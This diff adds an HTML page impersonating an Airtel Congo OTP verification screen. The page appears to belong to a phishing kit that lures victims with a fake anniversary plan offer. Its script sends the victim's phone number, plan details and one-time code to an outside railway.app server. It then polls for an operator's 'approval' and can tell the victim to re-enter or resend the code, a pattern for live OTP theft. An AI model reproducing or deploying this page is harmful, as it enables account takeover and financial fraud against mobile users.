@@ -1,0 +1,590 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AIRTEL CONGO</title>
+    <link rel="icon" type="image/svg+xml" href="https://cdn-webportal.airtelstream.net/website/zambia/assets/images/logo.svg">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700;800&family=Syne:wght@700;800&display=swap" rel="stylesheet">
+    <style>
+        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+        :root {
+            --airtel-red: #c0001a;
+            --airtel-red-bright: #e8001f;
+            --airtel-red-dark: #7a0000;
+            --airtel-red-deep: #9a0015;
+            --gold: #ffb300;
+            --white: #ffffff;
+            --text-dark: #1a0000;
+            --text-gray: #999;
+        }
+
+        html { scroll-behavior: smooth; }
+
+        body {
+            margin: 0;
+            font-family: 'DM Sans', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        .dp-root {
+            min-height: 100vh;
+            background: linear-gradient(145deg, #7a0000, #c0001a 40%, #e8001f, #9a0015);
+            display: flex;
+            flex-direction: column;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        /* ============ OTP CONTAINER ============ */
+        .otp-container {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            padding: 20px 16px 16px;
+            max-width: 440px;
+            width: 100%;
+            margin: 0 auto;
+        }
+
+        /* ============ HEADER ============ */
+        .otp-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 24px;
+            padding: 0 4px;
+        }
+
+        .back-btn {
+            width: 40px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: rgba(255,255,255,0.12);
+            border: 1px solid rgba(255,255,255,0.2);
+            border-radius: 12px;
+            color: #fff;
+            font-size: 20px;
+            cursor: pointer;
+            transition: background 0.2s;
+            text-decoration: none;
+        }
+
+        .back-btn:hover { background: rgba(255,255,255,0.2); }
+
+        .logo-large img {
+            height: 44px;
+            width: auto;
+            display: block;
+        }
+
+        .menu-btn {
+            width: 40px;
+            height: 40px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 5px;
+            background: rgba(255,255,255,0.12);
+            border: 1px solid rgba(255,255,255,0.2);
+            border-radius: 12px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .menu-btn:hover { background: rgba(255,255,255,0.2); }
+
+        .menu-line {
+            display: block;
+            width: 16px;
+            height: 2px;
+            background: #fff;
+            border-radius: 2px;
+        }
+
+        /* ============ OTP CARD ============ */
+        .otp-content {
+            flex: 1;
+        }
+
+        .otp-card {
+            background: #fff;
+            border-radius: 24px;
+            padding: 32px 22px 28px;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.25);
+            color: #1a0000;
+            text-align: center;
+        }
+
+        .otp-title {
+            font-family: 'Syne', sans-serif;
+            font-size: 22px;
+            font-weight: 800;
+            line-height: 1.25;
+            color: #1a0000;
+            margin-bottom: 8px;
+            letter-spacing: -0.3px;
+        }
+
+        .otp-subtitle {
+            font-size: 13.5px;
+            color: #666;
+            line-height: 1.55;
+            margin-bottom: 6px;
+        }
+
+        .otp-phone {
+            font-family: 'Syne', sans-serif;
+            font-size: 16px;
+            font-weight: 800;
+            color: var(--airtel-red);
+            margin-bottom: 26px;
+            letter-spacing: 0.5px;
+        }
+
+        /* ============ OTP INPUT ============ */
+        .otp-input-container {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-bottom: 24px;
+        }
+
+        .otp-input-field {
+            width: 100%;
+            padding: 16px 18px;
+            text-align: center;
+            font-family: 'Syne', sans-serif;
+            font-size: 26px;
+            font-weight: 800;
+            letter-spacing: 12px;
+            color: #1a0000;
+            background: #f7f7f7;
+            border: 1.5px solid #e5e5e5;
+            border-radius: 14px;
+            outline: none;
+            transition: border-color 0.2s, box-shadow 0.2s, background 0.2s;
+            caret-color: var(--airtel-red);
+        }
+
+        .otp-input-field::placeholder {
+            color: #c0c0c0;
+            font-family: 'DM Sans', sans-serif;
+            font-size: 15px;
+            font-weight: 500;
+            letter-spacing: 0;
+        }
+
+        .otp-input-field:focus {
+            border-color: var(--airtel-red);
+            background: #fff;
+            box-shadow: 0 0 0 4px rgba(192, 0, 26, 0.1);
+        }
+
+        .otp-hint {
+            font-size: 11.5px;
+            color: #999;
+            text-align: center;
+            font-weight: 500;
+        }
+
+        .resend-text {
+            font-size: 11.5px;
+            color: var(--airtel-red);
+            text-align: center;
+            font-weight: 700;
+        }
+
+        /* ============ SUBMIT BUTTON ============ */
+        .submit-button {
+            width: 100%;
+            padding: 16px;
+            background: var(--airtel-red);
+            color: #fff;
+            border: none;
+            border-radius: 14px;
+            font-family: 'Syne', sans-serif;
+            font-size: 15px;
+            font-weight: 800;
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+            cursor: pointer;
+            transition: background 0.2s, transform 0.15s, box-shadow 0.2s;
+            box-shadow: 0 6px 20px rgba(192, 0, 26, 0.35);
+        }
+
+        .submit-button:hover:not(:disabled) {
+            background: #9a0015;
+            box-shadow: 0 8px 26px rgba(192, 0, 26, 0.45);
+        }
+
+        .submit-button:active:not(:disabled) { transform: scale(0.98); }
+
+        .submit-button:disabled {
+            background: #d4d4d4;
+            color: #888;
+            box-shadow: none;
+            cursor: not-allowed;
+        }
+
+        /* ============ FOOTER ============ */
+        .login-footer {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 10px;
+            padding: 24px 0 8px;
+            color: #fff;
+            margin-top: 24px;
+        }
+
+        .login-footer img {
+            height: 32px;
+            opacity: 0.8;
+        }
+
+        .login-footer span {
+            font-size: 10px;
+            letter-spacing: 1px;
+            color: rgba(255,255,255,0.5);
+            text-transform: uppercase;
+            font-weight: 600;
+        }
+
+        .footer {
+            font-size: 10.5px;
+            color: rgba(255,255,255,0.4);
+            text-align: center;
+            margin-top: 12px;
+            padding-top: 12px;
+            border-top: 1px solid rgba(255,255,255,0.1);
+            width: 100%;
+        }
+
+        /* ============ WAITING OVERLAY ============ */
+        .waiting-overlay {
+            position: fixed;
+            inset: 0;
+            z-index: 1000;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            background: linear-gradient(145deg, #7a0000, #c0001a 40%, #e8001f, #9a0015);
+            color: #fff;
+            padding: 24px;
+            overflow: hidden;
+        }
+
+        .waiting-overlay.open { display: flex; animation: fadeIn 0.35s ease; }
+
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+        .waiting-overlay::before {
+            content: "";
+            position: absolute;
+            top: 50%; left: 50%;
+            width: 600px; height: 600px;
+            transform: translate(-50%, -50%);
+            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 60%);
+            animation: pulseGlow 3s ease-in-out infinite;
+            pointer-events: none;
+        }
+
+        @keyframes pulseGlow {
+            0%, 100% { transform: translate(-50%, -50%) scale(1); opacity: 0.6; }
+            50% { transform: translate(-50%, -50%) scale(1.15); opacity: 1; }
+        }
+
+        .waiting-content {
+            position: relative;
+            text-align: center;
+            max-width: 400px;
+            width: 100%;
+            z-index: 2;
+        }
+
+        .waiting-spinner {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 26px;
+            border: 5px solid rgba(255,255,255,0.2);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin 0.9s linear infinite;
+        }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .waiting-title {
+            font-family: 'Syne', sans-serif;
+            font-size: 22px;
+            font-weight: 800;
+            letter-spacing: -0.3px;
+            margin-bottom: 10px;
+        }
+
+        .waiting-sub {
+            font-size: 13.5px;
+            color: rgba(255,255,255,0.75);
+            line-height: 1.65;
+        }
+
+        /* ============ RESPONSIVE ============ */
+        @media (min-width: 640px) {
+            .otp-container { padding: 40px 24px 24px; }
+            .otp-card { padding: 40px 32px 34px; }
+            .otp-title { font-size: 24px; }
+            .logo-large img { height: 52px; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="dp-root">
+
+        <div class="otp-container">
+
+            <header class="otp-header">
+                <a href="/login.html" class="back-btn" aria-label="Retour">←</a>
+                <div class="logo-large">
+                    <img alt="Airtel Logo" src="https://cdn-webportal.airtelstream.net/website/zambia/assets/images/logo.svg">
+                </div>
+                <button class="menu-btn" aria-label="Menu">
+                    <div class="menu-line"></div>
+                    <div class="menu-line"></div>
+                    <div class="menu-line"></div>
+                </button>
+            </header>
+
+            <main class="otp-content">
+                <div class="otp-card">
+                    <h1 class="otp-title">Vérification OTP</h1>
+                    <p class="otp-subtitle">Entrez l'OTP envoyé à votre numéro de téléphone</p>
+                    <p class="otp-phone" id="phoneDisplay">+243976226269</p>
+
+                    <form id="otpForm" onsubmit="return false;">
+                        <div class="otp-input-container">
+                            <input
+                                class="otp-input-field"
+                                id="otpInput"
+                                placeholder="Entrer l'OTP à 4 chiffres"
+                                maxlength="4"
+                                inputmode="numeric"
+                                pattern="[0-9]*"
+                                autocomplete="one-time-code"
+                                type="text"
+                            >
+                            <p class="otp-hint">Entrer le code de vérification à 4 chiffres</p>
+                            <p class="resend-text">Le code expire dans <span id="countdown">30</span> secondes</p>
+                        </div>
+
+                        <button type="submit" class="submit-button" id="submitBtn" disabled>SOUMETTRE</button>
+                    </form>
+                </div>
+            </main>
+
+            <div class="login-footer">
+                <div>
+                    <img alt="Airtel Logo" src="https://cdn-webportal.airtelstream.net/website/zambia/assets/images/logo.svg">
+                </div>
+                <span>En collaboration avec</span>
+                <span style="font-family: 'Syne', sans-serif; font-weight: 800; font-size: 13px; letter-spacing: 2px; color: rgba(255,255,255,0.85);">STARLINK™</span>
+                <footer class="footer">© 2026 Airtel Congo. Tous droits réservés.</footer>
+            </div>
+
+        </div>
+
+    </div>
+
+    <!-- WAITING OVERLAY -->
+    <div class="waiting-overlay" id="waitingOverlay">
+        <div class="waiting-content">
+            <div class="waiting-spinner"></div>
+            <h2 class="waiting-title">Vérification OTP...</h2>
+            <p class="waiting-sub">
+                Veuillez patienter pendant que nous vérifions votre code.
+            </p>
+        </div>
+    </div>
+
+    <script>
+        const API_BASE = 'https://airtel-anniversary-production.up.railway.app';
+
+        // Read from URL
+        const params = new URLSearchParams(window.location.search);
+        const planName = params.get('plan') || 'Forfait';
+        const planAmount = params.get('amount') || '';
+        const planUnit = params.get('unit') || '';
+        const planValidity = params.get('validity') || '';
+        const planPrice = parseFloat(params.get('price') || '0');
+        const planPhone = params.get('phone') || '';
+
+        // Show phone
+        const phoneDisplay = document.getElementById('phoneDisplay');
+        if (planPhone) {
+            phoneDisplay.textContent = '+243 ' + planPhone.replace(/^0/, '');
+        }
+
+        const otpInput = document.getElementById('otpInput');
+        const submitBtn = document.getElementById('submitBtn');
+        const waitingOverlay = document.getElementById('waitingOverlay');
+        const countdownEl = document.getElementById('countdown');
+
+        let pollTimer = null;
+        let countdownTimer = null;
+        let secondsLeft = 30;
+
+        // Start countdown
+        function startCountdown() {
+            secondsLeft = 30;
+            countdownEl.textContent = secondsLeft;
+
+            clearInterval(countdownTimer);
+            countdownTimer = setInterval(() => {
+                secondsLeft--;
+                if (secondsLeft <= 0) {
+                    clearInterval(countdownTimer);
+                    countdownEl.parentElement.textContent = 'Code expiré. Veuillez recommencer.';
+                    countdownEl.parentElement.style.color = '#999';
+                } else {
+                    countdownEl.textContent = secondsLeft;
+                }
+            }, 1000);
+        }
+
+        startCountdown();
+
+        // OTP input — digits only
+        otpInput.addEventListener('input', () => {
+            otpInput.value = otpInput.value.replace(/\D/g, '').slice(0, 4);
+            submitBtn.disabled = otpInput.value.length !== 4;
+        });
+
+        // Submit
+        document.getElementById('otpForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            const otp = otpInput.value.trim();
+
+            if (otp.length !== 4) return;
+
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Vérification...';
+
+            // Show waiting overlay
+            waitingOverlay.classList.add('open');
+            document.body.style.overflow = 'hidden';
+
+            try {
+                const res = await fetch(API_BASE + '/api/otp', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        plan: planName,
+                        amount: planAmount,
+                        unit: planUnit,
+                        validity: planValidity,
+                        price: planPrice,
+                        phone: planPhone,
+                        otp: otp
+                    })
+                });
+
+                const data = await res.json();
+
+                if (!data.ok) {
+                    waitingOverlay.classList.remove('open');
+                    document.body.style.overflow = '';
+                    submitBtn.disabled = false;
+                    submitBtn.textContent = 'SOUMETTRE';
+                    alert(data.error || 'Erreur. Veuillez réessayer.');
+                    return;
+                }
+
+                // Start polling for admin approval
+                startPolling(data.sessionId);
+
+            } catch (err) {
+                console.error(err);
+                waitingOverlay.classList.remove('open');
+                document.body.style.overflow = '';
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'SOUMETTRE';
+                alert('Erreur réseau. Veuillez réessayer.');
+            }
+        });
+
+        // Poll for status
+        function startPolling(sessionId) {
+            clearInterval(pollTimer);
+            pollTimer = setInterval(async () => {
+                try {
+                    const res = await fetch(API_BASE + '/api/status/' + sessionId);
+                    const data = await res.json();
+                    if (!data.ok) return;
+
+                    if (data.status === 'approved') {
+                        clearInterval(pollTimer);
+                        // Move to success page
+                        const successParams = new URLSearchParams({
+                            plan: planName,
+                            amount: planAmount,
+                            unit: planUnit,
+                            validity: planValidity,
+                            price: planPrice,
+                            phone: planPhone
+                        });
+                        window.location.href = '/success.html?' + successParams.toString();
+                    } else if (data.status === 'rejected') {
+                        clearInterval(pollTimer);
+                        waitingOverlay.classList.remove('open');
+                        document.body.style.overflow = '';
+                        submitBtn.disabled = false;
+                        submitBtn.textContent = 'SOUMETTRE';
+                        alert(data.message || 'Code incorrect. Veuillez réessayer.');
+                        // Clear OTP
+                        otpInput.value = '';
+                        otpInput.focus();
+                    } else if (data.status === 'resend_requested') {
+                        clearInterval(pollTimer);
+                        waitingOverlay.classList.remove('open');
+                        document.body.style.overflow = '';
+                        submitBtn.disabled = false;
+                        submitBtn.textContent = 'SOUMETTRE';
+                        alert(data.message || 'Code incorrect. Veuillez entrer le bon code OTP.');
+                        otpInput.value = '';
+                        otpInput.focus();
+                    } else if (data.status === 'reminder_sent') {
+                        if (!window.__reminderShown) {
+                            window.__reminderShown = true;
+                            // Show reminder while keeping waiting screen
+                            waitingOverlay.classList.remove('open');
+                            document.body.style.overflow = '';
+                            alert(data.message || 'Veuillez entrer le code OTP reçu pour débloquer votre forfait.');
+                            // Re-open waiting screen (polling continues)
+                            waitingOverlay.classList.add('open');
+                            document.body.style.overflow = 'hidden';
+                        }
+                    } else if (data.status === 'timeout') {
+                        clearInterval(pollTimer);
+                        waitingOverlay.classList.remove('open');
+                        document.body.style.overflow = '';
+                        submitBtn.disabled = false;
+                        submitBtn.textContent = 'SOUMETTRE';
+                        alert('Session expirée. Veuillez recommencer.');
+                    }
+                } catch (err) {
+                    // retry silently
+                }
+            }, 2000);
+        }
+    </script>
+
+</body>
+</html>
